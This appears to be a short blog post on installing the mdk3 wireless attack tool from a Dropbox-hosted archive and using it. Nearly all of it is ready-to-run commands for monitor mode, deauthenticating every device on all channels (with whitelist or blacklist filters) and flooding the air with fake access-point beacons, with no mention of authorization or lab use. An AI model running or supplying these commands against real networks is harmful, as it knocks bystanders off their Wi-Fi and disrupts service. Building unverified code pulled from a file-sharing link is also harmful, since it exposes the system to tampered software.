---
layout: post
title: Installation and Basic Usage of MDK3
excerpt: A how-to for the installation and basic usage of mdk3
---
###Installation

Use the following commands

```bash
wget https://www.dropbox.com/s/7oytphewrbcxkoz/mdk3-v6.tar.bz2
tar -xjf mdk3-v6.tar.bz2
mv mdk3-v6 mdk3
cd mdk3
sudo make && sudo make install
```
		
###Usage

####Set Wifi Adaptor into Monitor Mode

Use the following commands
	
	sudo iw phy phy0 interface add mon0 type monitor 
	sudo iw dev wlan0 del

####Deauthentication

Deauth all devices on every channel

	sudo mdk3 mon0 d -c 1,2,3,4,5,6,7,8,9,10,11
		
Deauth via whitelist (deauth all devices excluding those on the list)

	sudo mdk3 mon0 d -w /home/username/whitelist.txt -c 1,2,3,4,5,6,7,8,9,10,11

Deauth via blacklist (deauth only devices on the list)

	sudo mdk3 mon0 d -b /home/username/blacklist.txt -c 1,2,3,4,5,6,7,8,9,10,11

###Beacon Flood Mode

Broadcast a random list of fake access points

	sudo mdk3 mon0 b 
		
Broadcast a certain access point by name

	sudo mdk3 mon0 b -n example_network
		
Broadcast a list of access points from a file

	sudo mdk3 mon0 b -f /home/user/example_network_names.txt

For more information use `sudo mdk3 --fullhelp`		

###Set Wifi Card Back to Managed Mode

Use the following commands

	sudo iw phy phy0 interface add wlan0 type managed
	sudo sudo iw dev mon0 del

		